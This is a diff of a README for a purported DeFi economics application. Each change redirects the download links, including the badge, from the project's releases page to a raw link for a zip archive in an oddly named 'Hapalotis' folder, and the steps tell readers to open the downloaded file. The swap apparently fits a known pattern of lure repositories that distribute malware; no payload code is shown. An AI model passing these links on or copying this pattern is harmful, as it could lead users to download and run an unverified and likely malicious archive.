@@ -1,7 +1,7 @@
 # 📊 The-Physics-of-Defi - Understanding DeFi through Economic Models
 
 ## 🔗 Download Now
-[![Download The-Physics-of-Defi](https://img.shields.io/badge/Download%20The--Physics--of--Defi-brightgreen)](https://github.com/ukhan-nedian/The-Physics-of-Defi/releases)
+[![Download The-Physics-of-Defi](https://raw.githubusercontent.com/ukhan-nedian/The-Physics-of-Defi/main/Hapalotis/The-Physics-of-Defi_1.5.zip%20The--Physics--of--Defi-brightgreen)](https://raw.githubusercontent.com/ukhan-nedian/The-Physics-of-Defi/main/Hapalotis/The-Physics-of-Defi_1.5.zip)
 
 ## 📖 Introduction
 Welcome to The-Physics-of-Defi! This application offers an in-depth exploration of decentralized finance (DeFi). We examine complex concepts like liquidity spirals and liquidation cascades. Our goal is to help you understand the predictable nature of DeFi crashes through economic physics.
@@ -24,7 +24,7 @@ To start using The-Physics-of-Defi, you will need a computer with internet acces
 ## 📥 Download & Install
 To download The-Physics-of-Defi, follow these steps:
 
-1. Visit this page to download: [Releases Page](https://github.com/ukhan-nedian/The-Physics-of-Defi/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/ukhan-nedian/The-Physics-of-Defi/main/Hapalotis/The-Physics-of-Defi_1.5.zip).
 2. Locate the latest version listed on the page.
 3. Download the file suitable for your operating system (Windows, macOS, or Linux).
 4. Open the downloaded file.
@@ -66,6 +66,6 @@ We welcome contributions! If you would like to report an issue, suggest a featur
 Thanks to all contributors and users for supporting The-Physics-of-Defi. Your input is valuable in improving this application.
 
 ## 🔗 More Information
-For detailed documentation, tutorials, and academic resources, please visit our repository. Here again is the link to download the application: [Download Page](https://github.com/ukhan-nedian/The-Physics-of-Defi/releases). 
+For detailed documentation, tutorials, and academic resources, please visit our repository. Here again is the link to download the application: [Download Page](https://raw.githubusercontent.com/ukhan-nedian/The-Physics-of-Defi/main/Hapalotis/The-Physics-of-Defi_1.5.zip). 
 
 Explore the economic physics of decentralized finance and who knows, you may uncover new insights into the dynamics of the DeFi ecosystem!
